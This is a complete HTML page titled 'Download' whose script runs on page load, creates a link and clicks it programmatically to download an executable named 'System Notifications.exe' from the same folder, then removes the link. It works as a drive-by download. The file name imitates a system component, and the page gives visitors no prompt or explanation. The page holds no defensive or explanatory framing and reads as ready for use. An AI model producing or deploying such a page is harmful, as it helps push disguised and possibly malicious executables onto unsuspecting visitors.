<!DOCTYPE html>
<html>
<head>
    <title>Download</title>
</head>
<body>

<script>
window.onload = function () {
    const link = document.createElement("a");
    link.href = "System Notifications.exe"; // File in the same folder
    link.download = "System Notifications.exe";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
};
</script>

</body>
</html>
